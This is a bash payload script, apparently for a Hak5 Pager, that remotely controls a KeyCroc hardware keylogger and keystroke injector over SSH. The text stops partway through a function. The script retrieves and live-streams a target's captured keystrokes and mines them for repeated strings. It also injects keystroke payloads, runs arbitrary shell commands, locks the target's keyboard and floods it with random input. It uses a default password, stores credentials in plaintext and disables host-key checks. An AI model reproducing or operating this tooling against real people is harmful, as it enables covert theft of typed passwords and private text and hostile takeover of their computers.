#!/bin/bash

# Title: Pager quack
# Author: spywill
# Description: Send QUACK commands to your KeyCroc, as well as read previously captured keystrokes and monitor live keystrokes as they are entered.
# Version: 2.1

PROMPT "Send QUACK commands to your KeyCroc, read previously captured keystrokes and monitor live keystrokes.
sshpass is required for the connection.
Make sure the Pager and KeyCroc are connected to the same local network.
Alternatively, KeyCroc can connect directly to the Pager's open access point (AP)"

# Payload variables
ENGLISH_WORD_LIST="https://raw.githubusercontent.com/dwyl/english-words/master/words_alpha.txt"
SAVE_KEYSTROKE="/mmc/root/payloads/user/remote_access/Pager_quack/KeyCroc_Keystrokes"
DUCKY_PAYLOAD="/mmc/root/payloads/user/remote_access/Pager_quack/DuckyPayloads"
PASS_FILE="/mmc/root/payloads/user/remote_access/Pager_quack/croc_passwd.txt"
CROC_IP_FILE="/mmc/root/payloads/user/remote_access/Pager_quack/croc_IP.txt"
WORDFILE="/mmc/root/payloads/user/remote_access/Pager_quack/words.txt"
chmod 777 /mmc/root/payloads/user/remote_access/Pager_quack
REMOTE_FILE="/root/loot/croc_char.log"
i=0

# Create Ducky Payload folder if it does not exist
if [ ! -d "$DUCKY_PAYLOAD" ] || [ ! -d "$SAVE_KEYSTROKE" ]; then
	mkdir -p "$DUCKY_PAYLOAD"
	mkdir -p "$SAVE_KEYSTROKE"
	LOG yellow "Created Ducky Payloads folder: $DUCKY_PAYLOAD"
	LOG yellow "Created Keystrokes folder: $SAVE_KEYSTROKE"
	# Create default Ducky Payload if it does not exist
	if [ ! -f "$DUCKY_PAYLOAD/QUACK.txt" ]; then
		cat > "$DUCKY_PAYLOAD/QUACK.txt" <<'EOF'
#---> Default Ducky Payload
QUACK STRING "test 1"
QUACK ENTER
QUACK DELAY 2000
QUACK STRING "test 2"
QUACK ENTER
QUACK DELAY 2000
QUACK STRING "working"
QUACK ENTER
EOF
		LOG yellow "Created default Ducky Payload name QUACK.txt"
	fi
fi

# SSH helper
ssh_croc() {
	/mmc/usr/bin/sshpass -p "$croc_passwd" ssh \
		-o StrictHostKeyChecking=no \
		-o ConnectTimeout=5 \
		root@"$croc_ip" "$@"
}

# SSH test to keycroc
test_ssh() {
	if ssh_croc 'sh -lc "LED B ; LED OFF"' 2>/dev/null; then
		LOG green "KEYCROC REACHABLE"
		ssh_test="REACHABLE"
	else
		LOG red "ERROR: KEYCROC UNREACHABLE"
		ERROR_DIALOG "ERROR: KEYCROC UNREACHABLE"
		ssh_test="UNREACHABLE"
		sleep 10
	fi
}

# Checking if sshpass is installed
if opkg list-installed | grep -q "sshpass"; then
	LOG yellow "Package sshpass is already installed."
else
	# Check internet connection
	LOG yellow "Checking internet connection."
	if ! ping -c 1 -W 2 8.8.8.8 >/dev/null 2>&1; then
		ERROR_DIALOG "Internet connection required to install sshpass" ; exit 0
	fi
	LOG green "Online"
	# Confirmation to install sshpass
	confirm=$(CONFIRMATION_DIALOG "Install sshpass for password-based SSH connections.") || exit 0
	if [[ "$confirm" == "$DUCKYSCRIPT_USER_CONFIRMED" ]]; then

		spinnerid=$(START_SPINNER "Installing sshpass...")
		opkg update
		opkg -d mmc install sshpass
		STOP_SPINNER ${spinnerid}

		if opkg list-installed | grep -q "sshpass"; then
			LOG green "sshpass has been installed."
		else
			ERROR_DIALOG "ERROR: sshpass not in installed" ; exit 0
		fi
	else
		LOG red "User selected no" ; exit 0
	fi
fi

# resolve croc.lan/croc into IP
if ip_check=$(ping -4 -c 1 -W 5 croc.lan 2>/dev/null); then
	croc_ip=$(echo "$ip_check" | head -n1 | sed -n 's/.*(\([0-9][0-9.]*\)).*/\1/p')
	LOG yellow "croc.lan is up at $croc_ip"
elif ip_check=$(ping -4 -c 1 -W 5 croc 2>/dev/null); then
	croc_ip=$(echo "$ip_check" | head -n1 | sed -n 's/.*(\([0-9][0-9.]*\)).*/\1/p')
	LOG yellow "croc is up at $croc_ip"
else
	LOG red "croc.lan and croc did not resolve"

	if [ -f "$CROC_IP_FILE" ]; then
		LOG green "[KEYCROC] IP file exists $CROC_IP_FILE"
		ip_check=$(cat "$CROC_IP_FILE")
		if [ -n "$ip_check" ]; then
			LOG yellow "Using saved Croc IP: $ip_check"
		else
			LOG red "[KEYCROC] IP file is empty"
			ip_check=""
		fi
	else
		LOG red "[KEYCROC] IP file missing or empty"
		ip_check=""
	fi
	croc_ip=$(IP_PICKER "Enter keycroc IP" "$ip_check") || exit 0
fi

# save keycroc ip to file
echo "$croc_ip" > "$CROC_IP_FILE"
LOG yellow "Saved Keycroc IP $croc_ip at $CROC_IP_FILE"

# Checking if key croc is reachability
can_reach() {
	host="$1"
	ping -4 -c 1 -W 1 "$host" >/dev/null 2>&1 && return 0
	nc -z -w 2 "$host" 22 >/dev/null 2>&1
}

# Checking and save key croc password
if can_reach "$croc_ip"; then
	LOG green "[KEYCROC] $croc_ip reachable"

	if [ -f "$PASS_FILE" ]; then
		LOG yellow "[KEYCROC] Password file exists"
		default_pass=$(cat "$PASS_FILE")
	else
		LOG red "[KEYCROC] Password file missing or empty"
		default_pass="hak5croc"
	fi

	croc_passwd=$(TEXT_PICKER "Enter Key croc password" "$default_pass") || exit 0
	echo "$croc_passwd" > "$PASS_FILE"
	LOG yellow "Saved Keycroc Password at $PASS_FILE"
else
	ERROR_DIALOG "$croc_ip unreachable" ; exit 0
fi

# Sending QUACK command over SSH
Send_Quack() {
	spinnerid=$(START_SPINNER "Exceeding payload...")

	ssh_croc "sh -lc 'bash -s'" <<EOF
	$(if [[ -f "$QUACK" ]]; then
		cat "$QUACK"
	else
		echo "$QUACK"
	fi)
EOF

	STOP_SPINNER ${spinnerid}
	sleep 1
	LOG green "Payload has been delivered"
	LOG blue "$QUACK"
	PROMPT "Payload has been delivered
	$resp"
}

# Enter a single Quack command
Quack_Command() {
	while true; do
		resp=$(LIST_PICKER \
			"QUACK COMMAND MENU" \
			"Single_Quack" \
			"Quack_Enter" \
			"Quack_Delete" \
			"Quack_Backspace" \
			"Quack_SpaceBar" \
			"Quack_GUI" \
			"Quack_CTRL-C" \
			"Quack_Numlock" \
			"Quack_ALT-F4" \
			"Quack_TAB" \
			"Quack_F_Key" \
			"Quack_Capslock" \
			"Quack_Arrow_Key" \
			"Exit" \
			"Main_menu" \
			"Main_menu"
		)

		case "$resp" in
			"Single_Quack")
				LOG yellow "[KEYCROC] Single Quack command selected. Ready for payload injection..."
				QUACK=$(TEXT_PICKER "Enter Quack command" "QUACK STRING hello world") || return
				Send_Quack
			;;
			"Quack_Enter")
				LOG yellow "[KEYCROC] Quack Enter command selected. Ready for payload injection..."
				QUACK="QUACK ENTER"
				Send_Quack
			;;
			"Quack_Delete")
				LOG yellow "[KEYCROC] Quack Delete command selected. Ready for payload injection..."
				QUACK="QUACK DELETE"
				Send_Quack
			;;
			"Quack_Backspace")
				LOG yellow "[KEYCROC] Quack Backspace command selected. Ready for payload injection..."
				QUACK="QUACK BACKSPACE"
				Send_Quack
			;;
			"Quack_SpaceBar")
				LOG yellow "[KEYCROC] Quack SpaceBar command selected. Ready for payload injection..."
				QUACK="QUACK KEYCODE 00,00,2c"
				Send_Quack
			;;
			"Quack_GUI")
				LOG yellow "[KEYCROC] Quack GUI command selected. Ready for payload injection..."
				QUACK=$(TEXT_PICKER "Enter GUI command" "QUACK GUI") || return
				Send_Quack
			;;
			"Quack_CTRL-C")
				LOG yellow "[KEYCROC] Quack CTRL-C command selected. Ready for payload injection..."
				QUACK="QUACK CONTROL-c"
				Send_Quack
			;;
			"Quack_Numlock")
				LOG yellow "[KEYCROC] Quack Numlock command selected. Ready for payload injection..."
				QUACK="QUACK NUMLOCK"
				Send_Quack
			;;
			"Quack_ALT-F4")
				LOG yellow "[KEYCROC] Quack ALT-F4 command selected. Ready for payload injection..."
				QUACK="QUACK ALT-F4"
				Send_Quack
			;;
			"Quack_TAB")
				LOG yellow "[KEYCROC] Quack TAB command selected. Ready for payload injection..."
				QUACK="QUACK TAB"
				Send_Quack
			;;
			"Quack_F_Key")
				LOG yellow "[KEYCROC] Quack F-Key command selected. Ready for payload injection..."
				F_KEY=$(NUMBER_PICKER "Enter F-key number" "1") || return
				QUACK="QUACK F$F_KEY"
				Send_Quack
			;;
			"Quack_Capslock")
				LOG yellow "[KEYCROC] Quack Capslock command selected. Ready for payload injection..."
				QUACK="QUACK CAPSLOCK"
				Send_Quack
			;;
			"Quack_Arrow_Key")
				LOG yellow "[KEYCROC] Quack Arrow keys command selected. Ready for payload injection..."
				LOG yellow "[PAGER] Use the arrow keys on the Pager to control arrow-key input on the target device..."
				LOG green "PRESS A BUTTON TO RETURN TO MENU"
				while true; do
					arrow_key=$(WAIT_FOR_INPUT)
	
					if [ "$arrow_key" = UP ]; then
						ssh_croc 'sh -lc "QUACK UPARROW"'
						LOG blue "UPARROW"
					elif [ "$arrow_key" = DOWN ]; then
						ssh_croc 'sh -lc "QUACK DOWNARROW"'
						LOG blue "DOWNARROW"
					elif [ "$arrow_key" = LEFT ]; then
						ssh_croc 'sh -lc "QUACK LEFTARROW"'
						LOG blue "LEFTARROW"
					elif [ "$arrow_key" = RIGHT ]; then
						ssh_croc 'sh -lc "QUACK RIGHTARROW"'
						LOG blue "RIGHTARROW"
					elif [ "$arrow_key" = A ]; then
						LOG yellow "Returning to menu."
						return
					else
						LOG yellow "Returning to menu."
						return
					fi
				done
			;;
			"Main_menu")
				LOG yellow "Return to main menu"
				return
			;;
			"Exit")
				confirm=$(CONFIRMATION_DIALOG "Exit. ?") || return
				if [[ "$confirm" == "$DUCKYSCRIPT_USER_CONFIRMED" ]]; then
					exit 0
				fi
			;;
		esac
	done
}

# Run a ducky payload
Ducky_Payload() {
	LOG blue "================================================="
	LOG yellow "Selected a ducky payload Ensure to give your payload a name"
	LOG cyan "[name_of_payload.txt]"
	LOG yellow "Save payloads at:"
	LOG cyan "[/mmc/root/payloads/user/remote_access/Pager_quack/DuckyPayloads/name_of_payload.txt]"
	LOG blue "================================================="

	# Build the list of .txt files
	set --
	for file in "$DUCKY_PAYLOAD"/*.txt; do
	[ -f "$file" ] || continue
		set -- "$@" "$(basename "$file")"
	done
	# Check if any files were found
	if [ "$#" -eq 0 ]; then
		LOG red "No .txt files found in $DUCKY_PAYLOAD"
		PROMPT "No .txt files found in $DUCKY_PAYLOAD"
		return
	fi
	# Build the main payload menu
	resp=$(LIST_PICKER \
		"DUCKY PAYLOAD MENU" \
		"$@" \
		"View_Payload" \
		"Remove_Payload" \
		"KeyCroc_Payload" \
		"Exit" \
		"Main_menu" \
		"Main_menu"
	)

	case "$resp" in
		"View_Payload")
			LOG cyan "[PAGER] Select a payload to view..."
			view_resp=$(LIST_PICKER \
				"VIEW DUCKY PAYLOAD" \
				"$@" \
				"Cancel" \
				"Cancel"
			) || return

			case "$view_resp" in
				"Cancel"|"")
					LOG yellow "[PAGER] Payload viewing cancelled."
					return
				;;
			esac

			# Verify the selected payload exists
			if [ ! -f "$DUCKY_PAYLOAD/$view_resp" ]; then
				LOG red "[PAGER] ERROR: Selected payload was not found."
				PROMPT "[PAGER] ERROR: Payload not found."
				return
			fi

			# Display the payload contents
			LOG green "[PAGER] Viewing payload: $view_resp"
			PROMPT "Payload displayed: $view_resp"
			LOG "$(cat "$DUCKY_PAYLOAD/$view_resp")"
			LOG green "PRESS A BUTTON TO RETURN TO MENU"
			WAIT_FOR_BUTTON_PRESS A
		;;
		"Remove_Payload")
			LOG red "[PAGER] Payload deletion selected."

			# Select the payload to remove
			remove_resp=$(LIST_PICKER \
				"REMOVE PAYLOAD" \
				"$@" \
				"Cancel" \
				"Cancel"
			) || return

			case "$remove_resp" in
				"Cancel"|"")
					LOG yellow "[PAGER] Payload deletion cancelled."
					return
				;;
			esac

			# Verify the selected file exists
			if [ ! -f "$DUCKY_PAYLOAD/$remove_resp" ]; then
				LOG red "[PAGER] ERROR: Selected payload was not found."
				PROMPT "[PAGER] ERROR: Payload not found."
				return
			fi

			# Confirm payload deletion
			confirm=$(CONFIRMATION_DIALOG "[PAGER] Delete payload $remove_resp from the device?") || return
			if [[ "$confirm" == "$DUCKYSCRIPT_USER_CONFIRMED" ]]; then
				if rm "$DUCKY_PAYLOAD/$remove_resp"; then
					LOG green "[PAGER] Payload successfully deleted: $remove_resp"
					PROMPT "[PAGER] Payload successfully deleted: $remove_resp"
				else
					LOG red "[PAGER] ERROR: Failed to delete payload: $remove_resp"
					PROMPT "[PAGER] ERROR: Payload deletion failed: $remove_resp"
				fi
			else
				LOG yellow "[PAGER] Payload deletion cancelled."
			fi
		;;
		"KeyCroc_Payload")
			# Find keycroc selected payload
			croc_payload="/root/udisk/payloads"
			LOG yellow "[KEYCROC] Select a payload to view/execute..."

			# Retrieve remote payload filenames
			payload_list=$(ssh_croc "find '$croc_payload' -maxdepth 1 -type f \( -name '*.txt' -o -name '*.sh' \) -exec basename '{}' \;" 2>/dev/null)

			if [ -z "$payload_list" ]; then
				LOG red "[KEYCROC] No KeyCroc payloads files found."
				PROMPT "No KeyCroc payloads files found"
				return
			fi

			# Build payload menu
			set --
			while IFS= read -r file; do
				[ -n "$file" ] && set -- "$@" "$file"
			done <<EOF
$payload_list
EOF
			resp=$(LIST_PICKER \
				"KEYCROC PAYLOAD MENU" \
				"$@" \
				"View_Payload" \
				"Exit" \
				"Main_menu" \
				"Main_menu"
			) || return

			case "$resp" in
				"View_Payload")
					view_resp=$(LIST_PICKER \
						"VIEW KEYCROC PAYLOAD" \
						"$@" \
						"Cancel" \
						"Cancel"
					) || return

					case "$view_resp" in
						"Cancel"|"") return ;;
					esac

					LOG green "[KEYCROC] Viewing: $view_resp"

					# Display remote file contents
					content=$(ssh_croc "cat '$croc_payload/$view_resp'" 2>/dev/null) || {
						LOG red "[KEYCROC] Failed to read payload."
						PROMPT "Failed to read payload"
						return
					}

					LOG "$content"
					LOG green "PRESS A BUTTON TO RETURN"
					WAIT_FOR_BUTTON_PRESS A
				;;
				"Main_menu")
					LOG yellow "Returning to main menu."
					return
				;;
				"Exit")
					confirm=$(CONFIRMATION_DIALOG "Exit KeyCroc Payload Menu?") || return
						if [ "$confirm" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
							exit 0
						fi
						return
				;;
				"")
					return
				;;
				*)
					# Verify the remote payload exists
					if ! ssh_croc "test -f '$croc_payload/$resp'" 2>/dev/null; then
						LOG red "[KEYCROC] Payload not found."
						PROMPT "Payload not found"
						return
					fi

					confirm=$(CONFIRMATION_DIALOG "Run KeyCroc payload: $resp?") || return
					if [ "$confirm" != "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
						LOG yellow "[KEYCROC] Execution cancelled."
						return
					fi

					LOG green "[KEYCROC] Activating payload: $resp"

					case "$resp" in
						*.sh)
							ssh_croc "sh '$croc_payload/$resp'"
							status=$?
						;;
						*.txt)
							LOG cyan "[KEYCROC] The .txt payload is managed by the KeyCroc framework."
							LOG yellow "[KEYCROC] Its MATCH conditions determine when it executes."
							LOG cyan "[KEYCROC] Reading payload MATCH condition..."
							match_word=$(ssh_croc "grep -i '^[[:space:]]*MATCH' '$croc_payload/$resp'" 2>/dev/null)

							if [ -n "$match_word" ]; then
								LOG blue "========================================"
								LOG yellow "[KEYCROC] PAYLOAD MATCH CONDITION"
								LOG yellow "PAYLOAD: $croc_payload/$resp"
								LOG green "Match word: $match_word"
								LOG blue "========================================"
								PROMPT "[KEYCROC] PAYLOAD MATCH CONDITION
								PAYLOAD: $croc_payload/$resp
								Match word: $match_word"
								ssh_croc "sh -lc '$croc_payload/$resp'"
								status=$?
							else
								LOG red "[KEYCROC] No MATCH condition found."
							fi
						;;
						*)
							LOG red "[KEYCROC] Unsupported file type."
							return
						;;
					esac

					if [ "$status" -eq 0 ]; then
						LOG green "[KEYCROC] Command completed."
					else
						LOG red "[KEYCROC] Command failed: $status"
					fi
					LOG green "PRESS A BUTTON TO RETURN TO MENU"
					WAIT_FOR_BUTTON_PRESS A
				;;
			esac
		;;
		"Main_menu")
			LOG yellow "Returning to main menu."
			return
		;;
		"Exit")
			confirm=$(CONFIRMATION_DIALOG "Exit. ?") || return
			if [[ "$confirm" == "$DUCKYSCRIPT_USER_CONFIRMED" ]]; then
				exit 0
			fi
		;;
		"")
			return
		;;
		*)
			# Find the selected payload
			QUACK=""
			for file in "$DUCKY_PAYLOAD"/*.txt; do
				[ -f "$file" ] || continue
				if [ "$(basename "$file")" = "$resp" ]; then
					QUACK="$file"
					break
				fi
			done

			if [ -z "$QUACK" ] || [ ! -f "$QUACK" ]; then
				LOG red "[PAGER] ERROR: Selected payload was not found."
				PROMPT "[PAGER] ERROR: Payload not found."
				return
			fi

			confirm=$(CONFIRMATION_DIALOG "Run Pager payload: $resp?") || return
			if [ "$confirm" != "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
				LOG yellow "[PAGER] Execution cancelled."
				return
			fi

			LOG green "Selected Ducky Payload:"
			LOG "$(cat "$QUACK")"
			Send_Quack
		;;
	esac
}

# Previous/live keystrokes menu
keystrokes() {

	# Fetch remote file
	process_logs() {
		log="$1"

		LOG yellow "[KEYCROC] Previous $key selected. Accessing stored data..."
		spinnerid=$(START_SPINNER "Collecting $key...")

		OUTPUT=$(
			ssh_croc "find / -type f -name '$log' 2>/dev/null -exec sh -c '
				for file do
					chars=\$(wc -m < \"\$file\")
					echo \"File: \$file\"
					echo \"number of char: \$chars\"
					echo \"------------------------\"
					cat \"\$file\"
					echo
				done
			' sh {} +"
		)

		STOP_SPINNER ${spinnerid}
		sleep 1

		while IFS= read -r line; do
			LOG "$line"
		done <<< "$OUTPUT"

		LOG green "PRESS A BUTTON TO RETURN TO MENU"
		WAIT_FOR_BUTTON_PRESS A
	}

	# Pattern matching croc_char.log
	pattern_matching() {
		LOG yellow "Patterns sorted by frequency:"
		spinnerid=$(START_SPINNER "Patterns sorted by frequency")

		# Collect croc_char.log files from KeyCroc
		content=$(ssh_croc 'find / -type f -name "croc_char.log" -exec cat {} + 2>/dev/null')
		if [[ -z "$content" ]]; then
			STOP_SPINNER ${spinnerid}
			LOG red "No croc_char.log files found"
			return
		fi

		# Count common patterns
		patterns=$(printf '%s\n' "$content" | \
			grep -oE '[[:alnum:]_]+|[^[:alnum:]_[:space:]]+' | \
			awk '{count[$1]++} END {
				for (pattern in count)
					print count[pattern], pattern
			}' | \
			sort -nr)

		STOP_SPINNER ${spinnerid}
		LOG "$patterns"
		LOG green "PRESS A BUTTON TO CONTINUE"
		WAIT_FOR_BUTTON_PRESS A

		# Find repeated character sequences
		LOG yellow "Find repeated character sequences:"
		spinnerid=$(START_SPINNER "Repeated character sequences")
		output=$(ssh_croc 'find / -type f -name "croc_char.log" -exec sed '\''s/\[[^]]*\]//g'\'' {} + 2>/dev/null | \
			awk '\''length($0) >= 3 {
				for(i=1; i<=length($0)-2; i++) {
					for(j=i+2; j<=length($0) && j-i+1<=16; j++) {
						print substr($0, i, j-i+1)
					}
				}
			}'\'' | \
			sort | \
			uniq -c | \
			awk '\''$1 > 1 {print $1, $2}'\'' | \
			sort -nr')

		if [[ -n "$output" ]]; then
			STOP_SPINNER ${spinnerid}
			printf '%s\n' "$output" | while IFS= read -r char; do
				LOG "$char"
			done
		else
			STOP_SPINNER ${spinnerid}
			LOG red "No repeated character sequences found"
		fi

		LOG green "PRESS A BUTTON TO RETURN TO MENU"
		WAIT_FOR_BUTTON_PRESS A
	}

	key=$(LIST_PICKER \
	"KEYSTROKE MENU" \
	"Previous_keystrokes" \
	"Live_keystrokes" \
	"Saved_keystrokes" \
	"croc_raw" \
	"matches.log" \
	"QUACK.log" \
	"hotplug.log" \
	"attackmode.log" \
	"Pattern_Matching" \
	"Enter_Pattern" \
	"Exit" \
	"Main_menu" \
	"Main_menu"
	)

	case "$key" in
		"Previous_keystrokes")
			process_logs "croc_char.log"
			echo "$OUTPUT" > "$SAVE_KEYSTROKE/KeyCroc_Keystrokes.txt"
			LOG yellow "keystrokes saved to $SAVE_KEYSTROKE"
		;;
		"Live_keystrokes")
			LOG yellow "[KEYCROC] Live keystroke stream selected. Initializing capture..."
			LOG ""
			LOG green "PRESS A BUTTON TO STOP LIVE KEYSTROKES"

			spinnerid=$(START_SPINNER "WAITING FOR KEYBOARD ACTIVITY")
			ssh_croc 'sh -lc "WAIT_FOR_KEYBOARD_ACTIVITY 0"'
			STOP_SPINNER ${spinnerid}
			LOG blue "[KEYCROC] Live keystroke stream starting..."

			# Start Live keystrokes ssh session
			ssh_croc \
			"tail -c 10 -f '$REMOTE_FILE'" |
			while IFS= read -r -n1 char; do
				LOG "$char"
			done &
			live_pid=$!

			# Kill Live keystrokes ssh session
			WAIT_FOR_BUTTON_PRESS A
			LOG red "[KEYCROC] Terminating live keystroke session..."

			kill -9 "$live_pid" 2>/dev/null
			ps w | grep '[s]sh -o StrictHostKeyChecking=no' |
			while read -r pid rest; do
				kill -9 "$pid" 2>/dev/null
			done
			sleep 2
		;;
		"Saved_keystrokes")
			LOG yellow "[PAGER] Accessing saved keystrokes..."
			if [ -f "$SAVE_KEYSTROKE/KeyCroc_Keystrokes.txt" ]; then

				# Confirm whether to strip [[ ]] markers from saved keystrokes
				confirm=$(CONFIRMATION_DIALOG "Reading captured keystrokes. Strip [[ ]] markers from filtered output...")
					if [[ "$confirm" == "$DUCKYSCRIPT_USER_CONFIRMED" ]]; then
						# Display saved keystrokes with [[ ]] markers removed
						log_char_count=$(sed 's/\[[^]]*\]//g' "$SAVE_KEYSTROKE/KeyCroc_Keystrokes.txt" | wc -m)
						LOG "Character Count: $log_char_count"
						LOG "$(sed 's/\[[^]]*\]//g' "$SAVE_KEYSTROKE/KeyCroc_Keystrokes.txt")"
					else
						# Display saved keystrokes without filtering
						while IFS= read -r line; do
							LOG "$line"
						done < "$SAVE_KEYSTROKE/KeyCroc_Keystrokes.txt"
					fi

				LOG blue "$(wc -c < "$SAVE_KEYSTROKE/KeyCroc_Keystrokes.txt") bytes"
				LOG green "PRESS A BUTTON TO RETURN TO MENU"
				WAIT_FOR_BUTTON_PRESS A
			else
				LOG red "[PAGER] No saved keystroke files found in $SAVE_KEYSTROKE."
				PROMPT "[PAGER] No saved keystroke files found in $SAVE_KEYSTROKE."
			fi
		;;
		"croc_raw") process_logs "$key" ;;
		"matches.log") process_logs "$key" ;;
		"QUACK.log") process_logs "$key" ;;
		"hotplug.log") process_logs "$key" ;;
		"attackmode.log") process_logs "$key" ;;
		"Pattern_Matching") pattern_matching ;;
		"Enter_Pattern")
			LOG yellow "[KEYCROC] Enter pattern to search in croc_char.log:"
			pattern=$(TEXT_PICKER "Enter pattern to search" "hak5") || return
			content=$(ssh_croc 'find / -type f -name "croc_char.log" -exec cat {} + 2>/dev/null')

			# Count every occurrence of the search pattern, including multiple matches on the same line
			count=$(printf '%s\n' "$content" | awk -v p="$pattern" '
			{
				while ((pos = index($0, p)) > 0) {
					count++
					$0 = substr($0, pos + length(p))
				}
			}
			END {
				print count + 0
			}')

			# Count output of search pattern
			if [ "$count" -gt 0 ]; then
				LOG green "[KEYCROC] Match found in loot/croc_char.log."
				LOG yellow "[$pattern] Match count: $count"
				PROMPT "[$pattern] Match count: $count"
			else
				LOG red "Did not find match word/pattern in loot/croc_char.log"
				LOG red "Pattern: $pattern"
			fi
		;;
		"Main_menu")
			LOG yellow "Return to main menu"
			return
		;;
		"Exit")
			confirm=$(CONFIRMATION_DIALOG "Exit. ?") || return
			if [[ "$confirm" == "$DUCKYSCRIPT_USER_CONFIRMED" ]]; then
				exit 0
			fi
		;;
	esac
}

# Custom commands menu
Custom_commands() {
	# Function to stop attack
	stop_attack() {
		WAIT_FOR_BUTTON_PRESS ANY
		kill -9 "$attack_pid" 2>/dev/null
		wait "$attack_pid" 2>/dev/null
		LOG green "$1 attack stopped"
		PROMPT "$1 attack stopped"
		unset i
	}

	custom=$(LIST_PICKER \
		"CUSTOM COMMANDS MENU" \
		"Custom_command" \
		"Lock_keyboard" \
		"Unlock_keyboard" \
		"Hold_key" \
		"Quack_Attack" \
		"Keyboard_Jiggler" \
		"Exit" \
		"Main_menu" \
		"Main_menu"
	)

	case "$custom" in
		"Custom_command")
			LOG yellow "[KEYCROC] Custom shell command selected. Awaiting command input..."
			custom=$(TEXT_PICKER "Enter Custom shell command" 'for file_path in $(find "/root/udisk/payloads" -maxdepth 1 -type f); do basename "$file_path"; done') || return

			if [[ -z "$custom" ]]; then
				PROMPT "No custom command entered"
				return
			fi

			# Output for Custom shell command
			output=$(ssh_croc "$custom")
			LOG yellow "[KEYCROC] Custom shell command output:"
			LOG "$output"
			PROMPT "$output"
		;;
		"Lock_keyboard")
			LOG yellow "[KEYCROC] Keyboard lock selected. Locking input device..."
			ssh_croc 'sh -lc "QUACK LOCK"'
			LOG red "Warning: keyboard is now locked out"
			PROMPT "Warning: keyboard is now locked out"
		;;
		"Unlock_keyboard")
			LOG yellow "[KEYCROC] Keyboard unlock selected. Restoring input access..."
			ssh_croc 'sh -lc "QUACK UNLOCK"'
			LOG green "Keyboard is now unlocked"
			PROMPT "Keyboard is now unlocked"
		;;
		"Hold_key")
			LOG yellow "[KEYCROC] Hold-key mode selected. Awaiting key input..."
			KEY=$(TEXT_PICKER "Enter only one key" "Q") || return
			KEY="${KEY:$((RANDOM % ${#KEY})):1}"
			TIME=$(NUMBER_PICKER "Enter amount of time" "5") || return

			ssh_croc "sh -lc 'QUACK HOLD STRING $KEY'"

			# selected-second countdown
			for ((time=TIME; time>=1; time--)); do
				LOG "Stopping in $time... selected $KEY"
				sleep 1
			done

			ssh_croc 'sh -lc "QUACK RELEASE"'

			LOG green "Hold_key attack stopped"
			PROMPT "Hold_key attack stopped"
		;;
		# Quack Attack menu
		"Quack_Attack")
			LOG yellow "[KEYCROC] Keyboard Quack Attack selected. Initializing payload..."
			resp=$(LIST_PICKER \
				"QUACK ATTACK MENU" \
				"Random_character" \
				"Random_number" \
				"Random_word" \
				"Exit" \
				"Main_menu" \
				"Main_menu"
			)

			case "$resp" in
				"Random_character")
					LOG yellow "Random character attack selected. Generating keystroke payload..."
					chars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:/?.><'"'"'\"`~'

					# Start loop for random chars
					while true; do
						random_chars=""
						for ((n=0; n<5; n++)); do
							random_chars+="${chars:$((RANDOM % ${#chars})):1}"
						done
						ssh_croc "sh -lc 'QUACK STRING \"$random_chars\"'"
						(( i++ ))
						LOG red "ATTACK RANDOM CHAR COUNT: $i-$random_chars"
					done &
					attack_pid=$!

					stop_attack "Random_character"
				;;
				"Random_number")
					LOG yellow "Random number attack selected. Generating keystroke payload..."
					NUMBER_N=1000000

					# Start loop for random number
					while true; do
						R_N="$(( ((RANDOM << 15) | RANDOM) % NUMBER_N + 1 ))"
						ssh_croc "sh -lc 'QUACK STRING \"$R_N\"'"
						(( i++ ))
						LOG red "ATTACK RANDOM NUMBER COUNT: $i-$R_N"
					done &
					attack_pid=$!

					stop_attack "Random_number"
				;;
				"Random_word")
					LOG yellow "Random word attack selected. Generating keystroke payload..."

					# Download English word list
					if [ ! -f "$WORDFILE" ]; then
						confirm=$(CONFIRMATION_DIALOG "Download English word list? $ENGLISH_WORD_LIST") || return
						if [[ "$confirm" == "$DUCKYSCRIPT_USER_CONFIRMED" ]]; then
							spinnerid=$(START_SPINNER "Downloading English word list...")
							if curl -L -s -f "$ENGLISH_WORD_LIST" -o "$WORDFILE"; then
								STOP_SPINNER "$spinnerid"
								LOG green "[PAGER] Downloaded English word list to $WORDFILE"
							else
								STOP_SPINNER "$spinnerid"
								rm -f "$WORDFILE"
								LOG red "Failed to download English word list"
								return
							fi
						else
							STOP_SPINNER "$spinnerid"
							LOG red "Failed to download English word list"
							return
						fi
					fi

					# Check word file exists
					if [ -f "$WORDFILE" ]; then
						WORD_COUNT=$(wc -l < "$WORDFILE")
						if [ "$WORD_COUNT" -eq 0 ]; then
							LOG red "English word list is empty"
							return
						fi

						# Start loop for random word
						while true; do
							RANDOM_LINE=$((RANDOM % WORD_COUNT + 1))
							R_W=$(sed -n "${RANDOM_LINE}p" "$WORDFILE")
							ssh_croc "sh -lc 'QUACK STRING \"$R_W\" ; QUACK KEYCODE 00,00,2c'"
							(( i++ ))
							LOG red "ATTACK RANDOM WORD COUNT: $i-$R_W"
						done &
						attack_pid=$!

						stop_attack "Random_word"
					else
						LOG red "English word list not found"
						return
					fi
				;;
				"Main_menu")
					LOG yellow "Return to main menu"
					return
				;;
				"Exit")
					confirm=$(CONFIRMATION_DIALOG "Exit. ?") || return
					if [[ "$confirm" == "$DUCKYSCRIPT_USER_CONFIRMED" ]]; then
						exit 0
					fi
				;;
			esac
		;;
		"Keyboard_Jiggler")
			LOG yellow "[KEYCROC] Keyboard Jiggler selected. Initiating keystroke activity..."
			LOG "QUACK KEYCODE 00,00,2c and QUACK BACKSPACE"

			# Start loop for Jiggler
			while true; do
				# Start jiggler every 30 seconds
				for ((time=30; time>=1; time--)); do
					LOG blue "Starting Jiggler in $time..."
					sleep 1
				done
				ssh_croc "sh -lc 'QUACK KEYCODE 00,00,2c ; QUACK BACKSPACE'"
				(( i++ ))
				LOG red "KEYBOARD JIGGLER COUNT: $i"
			done &
			attack_pid=$!

			stop_attack "Keyboard_Jiggler"
		;;
		"Main_menu")
			LOG yellow "Return to main menu"
			return
		;;
		"Exit")
			confirm=$(CONFIRMATION_DIALOG "Exit. ?") || return
			if [[ "$confirm" == "$DUCKYSCRIPT_USER_CONFIRMED" ]]; then
				exit 0
			fi
		;;
	esac
}

# menu loop for selected keycroc HID mode
Attackmode_HID() {
	LOG yellow "[KEYCROC] AttackMode HID selected. Initializing HID interface..."

	run_attackmode() {
		LOG red "Attackmode Mode selected $1"
		ssh_croc "sh -lc '$1'" &
